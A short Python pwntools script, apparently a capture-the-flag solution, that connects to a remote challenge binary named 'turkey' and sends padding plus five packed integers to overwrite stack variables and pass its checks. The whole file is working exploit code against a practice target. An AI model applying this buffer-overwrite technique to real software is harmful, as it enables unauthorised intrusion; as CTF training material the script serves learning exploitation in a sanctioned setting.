#RazviOverflow

from pwn import *

binary = remote("challenges.auctf.com", 30011)
#binary = process("./turkey")

padding = "A" * 16
firstcheck = p32(0x2a)
secondcheck = p32(0x15)
thirdcheck = p32(0x667463)
forthcheck = p32(0xffffffeb)
fifthcheck = p32(0x1337)

print binary.recvuntil("Sorry that's all I got!")
binary.sendline(padding+firstcheck+secondcheck+thirdcheck+forthcheck+fifthcheck)
print binary.recvall()